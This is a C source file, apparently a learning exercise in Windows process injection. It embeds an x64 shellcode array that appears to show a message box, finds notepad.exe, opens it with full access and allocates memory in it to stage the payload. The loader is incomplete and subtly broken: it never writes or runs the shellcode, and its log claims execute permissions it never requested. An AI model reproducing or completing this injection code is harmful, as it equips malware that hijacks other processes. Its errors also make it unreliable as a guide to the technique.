#include <stdbool.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <windows.h>

#define okay(msg, ...) printf("[+]" msg "\n", ##__VA_ARGS__);
#define info(msg, ...) printf("[*]" msg "\n", ##__VA_ARGS__);
#define warn(msg, ...) printf("[-]" msg "\n", ##__VA_ARGS__);

int main(int argc, char *argv[]) {
  /*shellcode*/
  unsigned char shellcode[] =
      "\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xcc\x00\x00\x00\x41"
      "\x51\x41\x50\x52\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b"
      "\x52\x18\x51\x56\x48\x8b\x52\x20\x48\x0f\xb7\x4a\x4a\x4d"
      "\x31\xc9\x48\x8b\x72\x50\x48\x31\xc0\xac\x3c\x61\x7c\x02"
      "\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x48\x8b"
      "\x52\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02"
      "\x41\x51\x0f\x85\x72\x00\x00\x00\x8b\x80\x88\x00\x00\x00"
      "\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b"
      "\x40\x20\x49\x01\xd0\xe3\x56\x4d\x31\xc9\x48\xff\xc9\x41"
      "\x8b\x34\x88\x48\x01\xd6\x48\x31\xc0\x41\xc1\xc9\x0d\xac"
      "\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39"
      "\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b"
      "\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x41"
      "\x58\x41\x58\x5e\x48\x01\xd0\x59\x5a\x41\x58\x41\x59\x41"
      "\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
      "\x8b\x12\xe9\x4b\xff\xff\xff\x5d\xe8\x0b\x00\x00\x00\x75"
      "\x73\x65\x72\x33\x32\x2e\x64\x6c\x6c\x00\x59\x41\xba\x4c"
      "\x77\x26\x07\xff\xd5\x49\xc7\xc1\x00\x00\x00\x00\xe8\x0f"
      "\x00\x00\x00\x49\x20\x4c\x69\x63\x6b\x65\x64\x20\x48\x65"
      "\x72\x74\x61\x00\x5a\xe8\x09\x00\x00\x00\x49\x6e\x6a\x65"
      "\x63\x74\x65\x64\x00\x41\x58\x48\x31\xc9\x41\xba\x45\x83"
      "\x56\x07\xff\xd5\x48\x31\xc9\x41\xba\xf0\xb5\xa2\x56\xff"
      "\xd5";

  // variables
  HANDLE hProcess = NULL, hSnapshot = NULL;
  LPVOID rAlloc_mem = NULL;
  PROCESSENTRY32 pe32;
  pe32.dwSize = sizeof(PROCESSENTRY32);

  // first we take a snapshot of the processes
  info("Taking Snapshot of the current processes...\n");
  hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
  if (hSnapshot == NULL) {
    warn("error while taking the snapshot, error: %lu\n", GetLastError());

    return EXIT_FAILURE;
  }
  okay("Snapshot was taken...\n");

  /*
    TH32CS_SNAPPROCESS: means you want to take a snapshot of the process list
    0: means you want to take a snapshot of all processes
  */
  if (!Process32First(hSnapshot, &pe32)) {
    warn("Eror while using the process32First function, error: %lu\n",
         GetLastError());
    return EXIT_FAILURE;
  }
  info("going throu the processes list...");

  do {
    if (wcscmp(pe32.szExeFile, L"notepad.exe") == 0) {
      info("%ls was found!\n", pe32.szExeFile);

      // now we will get a handel of the process
      info("Trying to Get a handel of the process...\n");
      hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);

      if (hProcess == NULL) {
        Warn("Couldn't get a handle to the process '%ls' PID <%ld>, error: %ld",
             pe32.szExeFile, pe32.th32ProcessID, GetLastError);
        return EXIT_FAILURE;
      }
      okay("Got a handle to the process '%ls' PID <%ld>\n\\---0x%p",
           pe32.szExeFile, pe32.th32ProcessID, hProcess);

      // Now we allocate bytes to the process memory.
      info("allocating bytes to the process memory...\n");
      rAlloc_mem = VirtualAllocEx(hProcess, NULL, sizeof(shellcode),
                                  (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE);
      if (!rAlloc_mem) {
        warn("VirtualAllocEx failed in target process '%s' , error: %lu",
             pe32.szExeFile, GetLastError());
        return EXIT_FAILURE;
      }
      okay("Allocated %zu bytes with PAGE_EXECUTE_READWRITE permissions",
           sizeof(shellcode));
    }
  } while (Process32Next(hSnapshot, &pe32));

  return EXIT_SUCCESS;
}